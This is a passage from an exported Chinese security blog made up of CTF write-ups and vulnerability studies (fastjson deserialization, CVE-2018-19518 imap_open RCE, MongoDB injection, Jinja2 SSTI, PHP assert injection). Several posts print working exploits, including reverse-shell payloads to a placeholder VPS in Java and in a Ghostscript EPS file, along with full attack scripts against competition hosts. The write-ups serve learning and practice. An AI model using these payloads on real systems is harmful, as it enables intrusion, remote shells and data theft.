\"&#123;[/error],produces=[text/html]&#125;\":&#123; \"bean\":\"requestMappingHandlerMapping\", \"method\":\"public org.springframework.web.servlet.ModelAndView org.springframework.boot.autoconfigure.web.BasicErrorController.errorHtml(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse)\" &#125;, \"&#123;[/error]&#125;\":&#123; \"bean\":\"requestMappingHandlerMapping\", \"method\":\"public org.springframework.http.ResponseEntity&lt;java.util.Map&lt;java.lang.String, java.lang.Object&gt;&gt; org.springframework.boot.autoconfigure.web.BasicErrorController.error(javax.servlet.http.HttpServletRequest)\"&#125; &#125; 访问secret_flag_here可以看到返回一个只允许本地访问的页面试了一堆改ip操作都不行，看到还有一个you_will_never_find_this_interface，访问一下看到有url，可以确定是要ssrf了，尝试一下url参数加个127.0.0.1，发现会返回eval，这里需要用dns-rebinding去绕过然后发包去intruder查看结果发现确实可以绕过他的检测，接下来就是fastjson的反序列化的利用了exp如下12345678910111213public class Exploit &#123; public Exploit()&#123; try&#123; java.lang.Runtime.getRuntime().exec( new String[]&#123;\"bash\",\"-c\",\"bash -c \\\"sh &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1\\\"\"&#125;); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; Exploit e = new Exploit(); &#125;&#125; 在vps上下载安装好marshalsec提供好ldap服务，mvn clean package -DskipTests编译好，也把Exploit.java编译好，在控制台敲出1java -cp ./target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your_ip:port/#Exploit 在一个端口起好http服务用来下载Exploit.java，然后发送下面的payload（要二次urlencode）1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://your_ip:1389/Exploit\",\"autoCommit\":true&#125; 然后就能get到shell了 happy go简单试下网站，有登录注册上传头像和留言板这些功能，同时也泄露了源码看源码可以看见admincontroller可以看到有一个删除头像的功能12345678910111213141516171819202122232425262728293031323334func (u *UserDelController) Get() &#123; uid := u.GetSession(\"uid\") if uid == nil &#123; u.Abort(\"500\") &#125; if uid.(int) != 1 &#123; u.Redirect(\"/\", http.StatusFound) return &#125; id := u.Ctx.Input.Param(\":id\") i, _ := strconv.Atoi(id) if i == 1 &#123; u.Redirect(\"/admin\", http.StatusFound) return &#125; o := orm.NewOrm() user := models.Users&#123;Id:i&#125; err := o.Read(&amp;user) if err != nil &#123; u.Abort(\"500\") &#125; if user.Avatar != \"/static/img/avatar.jpg\" &#123; os.Remove(user.Avatar) &#125; o.QueryTable(\"messages\").Filter(\"uid\", id).Delete() o.Delete(&amp;user) u.Redirect(\"/admin\", http.StatusFound)&#125; 这里可以看到如果修改头像参数，就可以删除任意文件继续审计源码还可以看到123456789func (c *InstallController) Get() &#123; _, err := os.Stat(\"conf/app.conf\") if err != nil &amp;&amp; os.IsNotExist(err) &#123; c.TplName = \"install.tpl\" &#125; else &#123; c.Redirect(\"/\", http.StatusFound) return &#125;&#125; 可以看到install文件里面会检查有没有app.conf文件，如果没有就会重新加载所以攻击思路就是以管理员身份登录，删掉app.conf，然后install，用恶意的mysql服务器读取任意文件，而伪造管理员身份就要去看主函数了1234567func main() &#123; beego.BConfig.WebConfig.Session.SessionName = \"PHPSESSID\" beego.BConfig.WebConfig.Session.SessionProvider=\"file\" beego.BConfig.WebConfig.Session.SessionProviderConfig = \"./tmp\" beego.BConfig.WebConfig.Session.SessionOn = true beego.Run()&#125; 贴一篇其他师傅的exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788# coding:utf-8import requestsimport base64ip=\"94.191.10.201\"host=\"http://94.191.10.201:7000\"registerURL = host + \"/auth/register\"loginURL = host + \"/auth/login\"userinfoURL = host + \"/userinfo\"req = requests.session()# registerregisterData=&#123;\"username\":\"ii5am3\",\"password\":\"123456\",\"confirmpass\":\"123456\",&#125;r = req.post(registerURL,data=registerData)print(\"[+] register \"+r.text)# loginloginData=&#123;\"username\":\"ii5am3\",\"password\":\"123456\",&#125;r = req.post(loginURL,data=loginData)print(r\"[+] login \"+r.text)# 获取当前登陆用户的sessionIDsessionID = r.request._cookies._cookies[ip][\"/\"][\"PHPSESSID\"].valueprint(r\"[+] sessionID is \"+ sessionID)# 上传session，伪造cookienewSession = sessionID[0:2]+\"5am3\"filename = \"../../tmp/%s/%s/%s\" %(sessionID[0],sessionID[1],newSession)# 本地搭建环境，登入uid为1的账号，然后获取他的session的文件即可。在这里我给大家attackSession = base64.b64decode(\"Dv+BBAEC/4IAARABEAAAGv+CAAEGc3RyaW5nDAUAA3VpZANpbnQEAgAC\")sessionFiles=&#123;\"uploadname\" : (filename, attackSession)&#125;r = req.post(userinfoURL,files=sessionFiles)print(r\"[+] newCookie is: PHPSESSID=\"+ newSession)##服务端伪造脚本# coding:utf-8import requestsimport base64# req表示user1，此时全程用该一个sessionreq = requests.session()ip = \"94.191.10.201\"host = \"http://94.191.10.201:7000\"registerURL = host + \"/auth/register\"loginURL= host + \"/auth/login\"userinfoURL = host + \"/userinfo\"deleteUserURL = host +\"/admin/user/del/2\"installURl = host + \"/install\"attackCookie = base64.b64decode(\"Dv+BBAEC/4IAARABEAAAGv+CAAEGc3RyaW5nDAUAA3VpZANpbnQEAgAC\")# registerregisterData=&#123;\"username\":\"ii5am3\",\"password\":\"123456\",\"confirmpass\":\"123456\",&#125;r= req.post(registerURL,data=registerData)print(\"[+] register \"+r.text)# loginloginData=&#123;\"username\":\"ii5am3\",\"password\":\"123456\",&#125;r = req.post(loginURL,data=loginData)print(r\"[+] login \"+r.text)sessionID= r.request._cookies._cookies[ip][\"/\"][\"PHPSESSID\"].valueprint(r\"[+] sessionID is \"+ sessionID)# 上传session，伪造cookienewSession = sessionID[0:2]+\"5am3\"filename = \"../../tmp/%s/%s/%s\" %(sessionID[0],sessionID[1],newSession)sessionFiles=&#123;\"uploadname\" : (filename, attackCookie)&#125;r = req.post(userinfoURL,files=sessionFiles)print(r\"[+] newSessionID is \"+ newSession)# 修改头像文件链接。sessionFiles=&#123;\"uploadname\" : (\"../../conf/app.conf\", \"12345\")&#125;r = req.post(userinfoURL,files=sessionFiles)# 新建一个请求，伪造admin进行删除用户headers=&#123;\"Cookie\":\"PHPSESSID=\"+newSession&#125;r = requests.get(deleteUserURL,headers=headers)# 重新安装环境，将其指向我们的恶意sql服务器。installData = &#123; \"host\":\"your_ip\", \"port\":\"your_port\", \"username\":\"hgame\",\"password\":\"hgame\",\"database\":\"hgame\"&#125;r = requests.post(installURl,installData)# 再次登录，使其再来一次请求。loginData=&#123;\"username\":\"ii5am3\",\"password\":\"123456\",&#125;r = req.post(loginURL,data=loginData)print(r\"[+] login \"+r.text)","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/11/2019-hgame-week4/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019 hgame week3","date":"2019-03-05T16:00:00.000Z","path":"2019/03/06/2019-hgame-week3/","text":"神奇的md5扫到泄露拿到swp文件，恢复12345678910111213141516171819202122&lt;?phpsession_start();error_reporting(0); if (@$_POST['username'] and @$_POST['password'] and @$_POST['code']) &#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; $code = (string)$_POST['code']; if (($username == $password ) or ($username == $code) or ($password == $code)) &#123; echo \"Your input can't be the same\"; &#125; else if ((md5($username) === md5($password)) and (md5($password) === md5($code)))&#123; echo \"Good\"; header('Location: admin.php'); exit(); &#125; else &#123; echo \"&lt;pre&gt; Invalid password&lt;/pre&gt;\"; &#125; &#125;?&gt; 利用fastcoll进行md5强碰撞，通过了检验就是命令执行了cat /fla? sqli-1爆破md5然后布尔盲注12345678910111213141516171819202122232425262728293031323334353637import requestsimport hashlibdef md5(str): sha = hashlib.md5(str) e = sha.hexdigest() return eres = ''url = 'http://118.89.111.179:3000/'cookie = &#123; 'PHPSESSID':'9jgb4e4s866rpfq3ivhg75r6fq'&#125;for i in range(1000): for j in range(33,128): r = requests.get(url,cookies=cookie) md5s = r.content[35:39] # print (md5s) code = 0 for x in range(10000000): if md5(str(x))[0:4] == md5s: code = x break url2 = 'http://118.89.111.179:3000/?code=%d&amp;id=%s' # hgame # payload = \"1 and (ascii(substr((select database()),%d,1))=%d)\"%(i,j) # f1l1l1l1g,words # payload = \"1 and (ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%d,1))=%d)\"%(i,j) # f14444444g # payload = \"1 and (ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='f1l1l1l1g'),%d,1))=%d)\"%(i,j) payload = \"1 and (ascii(substr((select f14444444g from f1l1l1l1g limit 0,1),%d,1))=%d)\"%(i,j) url2 = url2%(code,payload) r = requests.get(url2,cookies=cookie) if 'welcome' in r.content: res += chr(j) print res break sqli-2基础渗透babyxss","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/06/2019-hgame-week3/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019安恒杯二月赛","date":"2019-02-28T16:00:00.000Z","path":"2019/03/01/2019安恒杯二月赛/","text":"WEBmy email这题进去首先是一个注册的页面，然后登录进去后要你完善信息，也就是填一个邮箱和验证码，这里有个小坑点就是，虽然我们乱填他会说我们填的信息有误，但是再次访问发现我们的信息已经完善了，也就能进行下一步了进去以后看到有个更改背景的功能，尝试一下改了图片发现会1234567body&#123; background-image: url(./user/roujiji.jpg); background-size: 100%,100%; width: 100%; height: 100%;&#125;#roujiji是注册的用户名 所以可以猜测是将图片命名成用户名.jpg，尝试一下注册一个roujiji.php%00的账号，发现会被转义成roujiji.php\\00所以直接改用户名通过图片getshell是不行的了继续往下看，可以看到所以后台是有imap的，谷歌一下找到imap_open()有个漏洞（cve-2018-19518），对着肝一波触发了waf，测试一下发现过滤了base64 | \\，所以直接利用是不行的了，还是不能进行任意文件写入继续思考发现，因此知道文件路径，那么可以先上传一个文件，然后在文件里面写入任意代码，最后再在邮箱验证时触发它，最终exp然后菜刀连过去就行了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/01/2019安恒杯二月赛/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"},{"name":"crypto","slug":"web/crypto","permalink":"https://xi4or0uji.github.io/categories/web/crypto/"},{"name":"misc","slug":"web/crypto/misc","permalink":"https://xi4or0uji.github.io/categories/web/crypto/misc/"}],"tags":[{"name":"安恒杯","slug":"安恒杯","permalink":"https://xi4or0uji.github.io/tags/安恒杯/"}]},{"title":"imap_open()实现远程任意代码执行（CVE-2018-19518）","date":"2019-02-28T16:00:00.000Z","path":"2019/03/01/imap_open()实现远程任意代码执行（CVE-2018-19518）/","text":"这个漏洞是在做题的时候看到的，顺便复现一下，漏洞影响版本有ubuntu、debian、redhat和suse 简单介绍这个漏洞因为imap_open函数在传递邮箱名给ssh之前没有正确过滤邮箱名，导致攻击者可以利用-oProxyCommand参数向IMAP服务器发起命令执行恶意代码 复现装环境1apt updata &amp;&amp; apt install -y nano php php-imap 接着安装ssh和strace12apt install -y sshapt install -y strace 接着加一点安全配置，增加php的安全性123echo ‘; priority=99’ &gt; /etc/php/7.0/mods-available/disablefns.iniecho ‘disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source’ &gt;&gt; /etc/php/7.0/mods-available/disablefns.iniphpenmod disablefns imap顺便了解一下imap，imap其实就是一个管理电子邮件的东西，允许多个电子邮件客户端对电子邮件收件箱进行完全的管理调用语法1imap_open($mailbox, $username, $password [, $option = 0 [, $n_retries = 0 [, $params = []]]]); 如果要自定义连接的服务器使用的mailbox参数定义如下1&#123;[host]&#125;:[port][flags]&#125;[mailbox_name] 示例1imap_open(“&#123;mail.domain.com&#125;:143/imap/notls&#125;”, “user”, “passwd”) rshrsh直到现在依旧使用，我们可以看一下下面这张图 漏洞细节查看imap2007库的源码可以看到有个tcp_aopen函数/imap-2007f/src/osdep/unix/tcp_unix.c1234TCPSTREAM *tcp_aopen (NETMBX *mb,char *service,char *usrbuf)&#123; ......&#125; 接着检查ssh和rsh路径的定义/imap-2007f/src/osdep/unix/tcp_unix.c123456#ifdef SSHPATH /* ssh path defined yet? */ if (!sshpath) sshpath = cpystr (SSHPATH);#endif#ifdef RSHPATH /* rsh path defined yet? */ if (!rshpath) rshpath = cpystr (RSHPATH);#endif 可以看到，如果sshpath没有被定义，那就会定义rshpath，接下来我们去找sshpath的定义先看h文件的默认路径/imap-2007f/src/osdep/unix/env_unix.h1#define SYSCONFIG \"/etc/c-client.cf\" /imap-2007f/src/osdep/unix/env_unix.c12345void dorc (char *file,long flag)&#123; ...... else if (!compare_cstring (s,\"set ssh-path\")) mail_parameters (NIL,SET_SSHPATH,(void *) k); 可以看到默认情况下它是空的，但是我们也没有权限去修改，因为是etc文件，既然etc文件不可写，那我们可以考虑一下rshpath能不能改我们控制/imap-2007f/src/osdep/unix/Makefile12slx: # Secure LinuxRSHPATH=/usr/bin/rsh \\ 最后是执行情况/imap-2007f/src/osdep/unix/tcp_unix.c123456789101112if (*service == '*') &#123; /* want ssh? */ /* return immediately if ssh disabled */ if (!(sshpath &amp;&amp; (ti = sshtimeout))) return NIL; /* ssh command prototype defined yet? */ if (!sshcommand) sshcommand = cpystr (\"%s %s -l %s exec /etc/r%sd\"); &#125; /* want rsh? */ else if (rshpath &amp;&amp; (ti = rshtimeout)) &#123; /* rsh command prototype defined yet? */ if (!rshcommand) rshcommand = cpystr (\"%s %s -l %s exec /etc/r%sd\"); &#125; else return NIL; /* rsh disabled */ 可以看到他会生成一个在远程服务器上执行rimapd文件二进制的命令尝试一下测试一下test1.php1imap_open('&#123;localhost&#125;:143/imap&#125;INBOX', '', ''); 然后利用strace工具去观察脚本的执行过程（这里肉鸡环境imap开不起来，只能借大佬的图一用了通过execve过程可以看到localhost也作为了执行参数，因此尝试在操作服务器地址的同时加入命令行在ssh文件中，有-o这样的选项，通过这一个选项，我们就可以在命令行中加入任意指令了具体利用方向如下123$ubuntu: ssh -oProxyCommand=”echo hello|tee /tmp/executed” localhost$ubuntu: cat /tmp/executed$ hello 这样子确实可以进行命令执行，但是写在服务器地址的时候，空格和斜杠都会被转义掉，因此要用$IFS和\\t去绕过1ssh -oProxyCommand=”echo hello|tee (\\t这里是tab符) /tmp/executed” localhost 当然也可以利用base64编码，同样也是能进行命令执行的1234#先对命令行进行base64编码$ubuntu: echo “echo hello|tee /tmp/executed”|base64#得到编码后的命令ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZAo=就能进行利用了$ubuntu: ssh -oProxyCommand=”echo ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZAo=|ba se64 -d|bash” localhost 完整调用过程test2.php1234$payload = “echo hello|tee /tmp/executed”;$encoded_payload = ba se64_encode($payload);$server = “any -o ProxyCommand=echo\\t”.$encoded_payload.”|ba se64\\t-d|bash”;@imap_open(‘&#123;‘.$server.’&#125;:143/imap&#125;INBOX’, ‘’, ‘’); 将我们上面做的过程直接写进一个php文件观察他的调用过程通过strace的追踪，我们最终发现我们注入的命令都是由系统库去执行的，这谁拦得住啊…….. 参考https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable-functions-in-php-installations-6ccdbf4f52bb","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/01/imap_open()实现远程任意代码执行（CVE-2018-19518）/","categories":[{"name":"cve","slug":"cve","permalink":"https://xi4or0uji.github.io/categories/cve/"}],"tags":[{"name":"cve","slug":"cve","permalink":"https://xi4or0uji.github.io/tags/cve/"}]},{"title":"MongoDB注入","date":"2019-02-26T16:00:00.000Z","path":"2019/02/27/MongoDB注入/","text":"之前做比赛题经常会遇到mongodb注入，每次都一知半解一脸懵逼，总结一下 MongoDB概括记下增删改查（php5） 直接调用类方法1234567$mongodb = new mongoclient(); //建立连接$db = $mongodb-&gt;myinfo; //选择数据库$coll = $db-&gt;test; //选择集合$coll-&gt;save(); //增$coll-&gt;find(); //查$coll-&gt;remove(); //减$coll-&gt;update(); //改 execute方法1234567$monggdb = new mongoclient(); //建立连接$db = $monggdb-&gt;myinfo; //选择数据库$query = \"db.table.save(&#123;'newsid':1&#125;)\"; //增$query = \"db.table.find(&#123;'newsid':1&#125;)\"; //查$query = \"db.table.remove(&#123;'newsid':1&#125;)\"; //删$query = \"db.table.update(&#123;'newsid':1&#125;,&#123;'newsid',2&#125;)\"; //改$result = $db-&gt;execute($query); //执行 在php7中的利用会很麻烦，很多函数都不一样了，还有很多坑，所以还是建议php5写php7123$mongo = new MongoDB\\Driver\\Manager();$result = $mongo-&gt;executeQuery('db.collection', new MongoDB\\Driver\\Query(['uid'=&gt;$id], []), new MongoDB\\Driver\\ReadPreference(MongoDB\\Driver\\ReadPreference::RP_PRIMARY_PREFERRED));// 返回的$result是一个对象，需要手动转换成数组。 攻击基本操作在学习注入之前，先要学一下MongoDB的逻辑操作符12345678910gt 大于 &#123;\"field\": &#123;$gt: value&#125;&#125;lt 小于 &#123;\"field\": &#123;$lt: value&#125;&#125;gte 大于等于 &#123;\"field\": &#123;$gte: value&#125;&#125;lte 小于等于 &#123;\"filed\": &#123;$lte: value&#125;&#125;ne 不等于 &#123;\"member.age\": &#123;$ne: \"nine\"&#125;&#125;exists 是否存在 &#123;\"array.0\" &#123;$exists: 1&#125;&#125; #数组中是否存在第一条数据or 或者 &#123;\"$or\": [&#123;\"member.age\": \"3\"&#125;,&#123;\"member.name\": \"h4ck3r\"&#125;]&#125;and 并且 &#123;\"$and\": [&#123;\"member.age\": \"3\"&#125;,&#123;\"member.name\": \"h4ck3r\"&#125;]&#125;regex 正则 (&#123;\"name\": &#123;\"$regex\": \"^a$\"&#125;&#125;)size 个数 (&#123;\"name\": &#123;\"$size\": 3&#125;&#125;) #$size name元素个数为3 数组绑定时注入$ne注入先去扒一个脚本12345678910111213141516171819202122&lt;?php$mongo = new mongoclient(\"mongodb://127.0.0.1\");$db = $mongo-&gt;myinfo; //选择数据库$coll = $db-&gt;test; //选择集合$username = $_GET['username'];$password = $_GET['password'];$data = array( 'username'=&gt;$username, 'password'=&gt;$password );$data = $coll-&gt;find($data);$count = $data-&gt;count();if ($count&gt;0) &#123; foreach ($data as $user) &#123; echo 'username:'.$user['username'].\"&lt;/br&gt;\"; echo 'password:'.$user['password'].\"&lt;/br&gt;\"; &#125;&#125;else&#123; echo '未找到';&#125;?&gt; 可以看到，这个脚本会将输入的username和password扔去数据库找，如果有，就全部显示出来正常我们查询是1username=xiaorouji&amp;password=123456 这个时候后台的查询语句是1db.test.find(&#123;username:'xiaorouji',password:'123456'&#125;) 但是，如果我们输入的语句是1username[$ne]=xiaorouji&amp;password[$ne]=123456 这样子，后台语句就会变成1db.test.find(&#123;username:&#123;'$ne':'xiaorouji'&#125;,password:&#123;'$ne':'123456'&#125;&#125;) 这样就能获得后台除了xiaorouji这个账号的其他全部账号的信息了 $regex注入正则注入跟布尔盲注差不多，也是当页面只返回true或者false的时候，让他去一个个匹配，最终拿到值给一题hctf的题目，后台大致代码如下1234567891011121314151617181920212223&lt;?php$mongo = new mongoclient();$db = $mongo-&gt;myinfo; //选择数据库$coll = $db-&gt;test; //选择集合$lock = $_POST['lock'];$key = $_POST['key'];if (is_array($lock)) &#123; $data = array( 'lock'=&gt;$lock); $data = $coll-&gt;find($data); if ($data-&gt;count()&gt;0) &#123; echo 'the lock is right,but wrong key'; &#125;else&#123; echo 'lock is wrong'; &#125;&#125;else&#123; if ($lock == 'xxxxxxxx'&amp;&amp;$key=='xxxxxxxxx') &#123; echo 'Your flag is xxxxxxx'; &#125;else&#123; echo 'lock is wrong'; &#125;&#125;?&gt; 可以看到只有正确和错误的两种回显，payload如下1234567891011121314151617181920&lt;?php $ch=curl_init();curl_setopt($ch,CURLOPT_URL,'http://121.40.86.166:23339/');curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_POST,1);$ori = '0123456789abcdefghijklmnopqrstuvwxyz';$str = '';for ($i=0; $i &lt;10 ; $i++) &#123; for ($j=0; $j &lt;strlen($ori) ; $j++) &#123; $post = 'key=1&amp;lock[$regex]=^'.$str.$ori[$j]; curl_setopt($ch,CURLOPT_POSTFIELDS,$post); $data=curl_exec($ch); if (strlen($data) == 319) &#123; $str.=$ori[$j]; echo $str.\"\\r\\n\"; break; &#125; &#125;&#125;?&gt; 在数据库中的执行语句是1db.test.find(&#123;lock:&#123;'$regex':'^a'&#125;&#125;); 拼接字符串注入这种注入跟sql里面最基本的回显注入类似，举个栗子1234567891011121314151617181920&lt;?php$username = $_GET['username'];$password = $_GET['password'];$query = \"var data = db.test.findOne(&#123;username:'$username',password:'$password'&#125;);return data;\";//$query = \"return db.test.findOne();\";//echo $query;$mongo = new mongoclient();$db = $mongo-&gt;myinfo;$data = $db-&gt;execute($query);if ($data['ok'] == 1) &#123; if ($data['retval']!=NULL) &#123; echo 'username:'.$data['retval']['username'].\"&lt;/br&gt;\"; echo 'password:'.$data['retval']['password'].\"&lt;/br&gt;\"; &#125;else&#123; echo '未找到'; &#125;&#125;else&#123; echo $data['errmsg'];&#125;?&gt; 首先我们先尝试一下1username=123'&amp;password=123 这样我们首先会收到报错，因为单引号没有闭合，接下来尝试一个闭合语句这里有个坑点就是高版本的MongoDB好像不支持注释符，所以直接拿注释符注释后面实际上是不行的1username=test'&#125;);return (&#123;username:1,password:2&#125;);var foo = (&#123;'foo':'&amp;password=123 这样子后台还是可以返回一个数据，也就刚好能绕过前面的限制，获得特定的信息爆mongodb版本1username=test'&#125;);return (&#123;username:version(),password:2&#125;);var foo = (&#123;'foo':' 爆当前数据库1username=test'&#125;); return (&#123;username:toJson(db),password:2&#125;);var foo = (&#123;'foo':' 爆所有表1username=test'&#125;); return (&#123;username:toJson(db.getCollectionNames()),password:2&#125;); var foo = (&#123;'1&amp;password=123 查看文档db.collection.find()这个函数在无参的时候会返回集合中的所有文档以及里面的所有字段123username=test'&#125;); return (&#123;username:toJson(db.test.find()),password:2&#125;); (&#123;foo:'123&amp;password=123#查看单条信息username=test'&#125;); return (&#123;username:toJson(db.test.find()[1]),password:2&#125;); (&#123;foo:'123&amp;password=123 当然这中间还可以有更多的语句操作，不一一列举了 时间盲注跟sql的时间盲注原理相似，放个payload1username=test'&#125;); if (db.version()&gt;\"0\")&#123;sleep(10000);exit;&#125; var b=(&#123;a:'1&amp;password=123 这样就能成功延时了 $where注入MongoDB里面的$where跟sql的where很相似，都是加入限制条件进行查询。但是MongoDB里面的$where操作符常常会引入一个js函数作为 限制条件来造成注入后台代码1234567891011121314&lt;?php$mongo = new mongoclient();$db = $mongo-&gt;myinfo; //选择数据库$coll = $db-&gt;news; //选择集合$news = $_GET['news'];$function = \"function() &#123;if(this.news == '$news') return true&#125;\";echo $function;$result = $coll-&gt;find(array('$where'=&gt;$function));if ($result-&gt;count()&gt;0) &#123; echo '该新闻存在';&#125;else&#123; echo '该新闻不存在';&#125;?&gt; 上面这个代码如果我们输入news=test&#39;%26%26&#39;1&#39;=&#39;1会返回正常页面，然后输入news=test&#39;%26%26&#39;1&#39;=&#39;2会返回异常页面，那么我们就可以尝试一下进行注入了爆数据表名1news=test'%26%26db.getCollectionNames()[0][0]=='m'%26%26'1'=='1","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/27/MongoDB注入/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"https://xi4or0uji.github.io/tags/MongoDB/"}]},{"title":"2018 Tokyo Westerns CTF","date":"2019-02-25T16:00:00.000Z","path":"2019/02/26/2018-Tokyo-Westerns-CTF/","text":"WEBSimple Auth首先可以拿到源码1234567891011121314151617181920212223242526272829303132 &lt;?phprequire_once 'flag.php';if (!empty($_SERVER['QUERY_STRING'])) &#123; $query = $_SERVER['QUERY_STRING']; $res = parse_str($query); if (!empty($res['action']))&#123; $action = $res['action']; &#125;&#125;if ($action === 'auth') &#123; if (!empty($res['user'])) &#123; $user = $res['user']; &#125; if (!empty($res['pass'])) &#123; $pass = $res['pass']; &#125; if (!empty($user) &amp;&amp; !empty($pass)) &#123; $hashed_password = hash('md5', $user.$pass); &#125; if (!empty($hashed_password) &amp;&amp; $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e') &#123; echo $flag; &#125; else &#123; echo 'fail :('; &#125;&#125;else &#123; highlight_file(__FILE__);&#125; 它需要传过去的action等于auth，记录下user和pass，如果md5(user.pass)===’c019f6e5cd8aa0bbbcc6e994a54c757e’，那就有flag很明显直接md5进行解密是不行的，但是我们看到有个parse_str函数，而且还没有第二个参数，因此可以进行变量覆盖的漏洞利用，payload：1?action=auth&amp;hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e 然后就能拿到flag1TWCTF&#123;d0_n0t_use_parse_str_without_result_param&#125; Shrine这题进去就给了源码1234567891011121314151617181920import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist])+s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) 可以看到用了jinja和有一堆黑名单，猜测是jinja2的ssti注入 信息收集1、/shrine/&lt;path: shrine&gt;是注入点2、过滤了括号和config以及self3、漏洞是jinja2的ssti漏洞 简单尝试试下能不能执行12http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;3*3&#125;&#125;&gt;&gt;&gt;&gt;9 确实可以进行ssti，但是我们要想办法绕开waf如果完全没有waf，我们可以1234567# confighttp://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;config&#125;&#125;# self# &#123;&#123;self&#125;&#125; =&gt; &lt;TemplateReference None&gt;http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;self.__dict__&#125;&#125;# ()http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125; 但是现在有waf，所以我们不能直接利用，这里大佬给了两个利用点url_for在url_for里面，我们可以找到current_app12&#123;&#123;url_for.__globals__&#125;&#125;http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125; get_flashed_messages这个里面也能找到current_app12&#123;&#123;get_flashed_messages.__globals__&#125;&#125;http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125; 这样就能拿到flag了TWCTF{pray_f0r_sacred_jinja2} slack emoji converter依旧是能拿到源码1234567891011121314151617181920212223242526272829303132333435363738394041424344from flask import ( Flask, render_template, request, redirect, url_for, make_response,)from PIL import Imageimport tempfileimport osapp = Flask(__name__)@app.route('/')def index(): return render_template('index.html')@app.route('/source')def source(): return open(__file__).read()@app.route('/conv', methods=['POST'])def conv(): f = request.files.get('image', None) if not f: return redirect(url_for('index')) ext = f.filename.split('.')[-1] fname = tempfile.mktemp(\"emoji\") fname = \"&#123;&#125;.&#123;&#125;\".format(fname, ext) f.save(fname) img = Image.open(fname) w, h = img.size r = 128/max(w, h) newimg = img.resize((int(w*r), int(h*r))) newimg.save(fname) response = make_response() response.data = open(fname, \"rb\").read() response.headers['Content-Disposition'] = 'attachment; filename=emoji_&#123;&#125;'.format(f.filename) os.unlink(fname) return responseif __name__ == '__main__': app.run(host=\"0.0.0.0\", port=8080, debug=True) 这题考了GhostButt任意命令执行（cve-2017-8291），通过bypass dSAFER参数达到目的，exp如下12345678910!PS-Adobe-3.0 EPSF-3.0%%BoundingBox: 0 0 30 30userdict /setpagedevice undefsavelegal&#123; null restore &#125; stopped &#123; pop &#125; if&#123; legal &#125; stopped &#123; pop &#125; ifrestoremark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"vps-ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);') currentdevice putdeviceprops 然后就能getshell了具体分析请参考： https://paper.seebug.org/310/https://github.com/vulhub/vulhub/tree/master/python/PIL-CVE-2017-8291","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/26/2018-Tokyo-Westerns-CTF/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2018百越杯wp","date":"2019-02-23T16:00:00.000Z","path":"2019/02/24/2018百越杯wp/","text":"WEBwarmup源码1234567891011121314151617 &lt;?php require_once('flag.php'); error_reporting(0); if(!isset($_GET['u']))&#123; highlight_file(__FILE__); die(); &#125;else&#123; $i=$_GET['i']; $u=$_GET['u']; if($_GET['u']!=\"Hello World\")&#123; die('die...'); &#125; assert(\"$i == $u\"); // TODO // echo $flag; &#125; 有个assert函数，利用注释符将后面的东西注释掉，然后进行命令执行，payload12?u=Hello World&amp;i=system('cat flag.php');//?u=Hello World&amp;i=system('sort flag.php');%23 simple 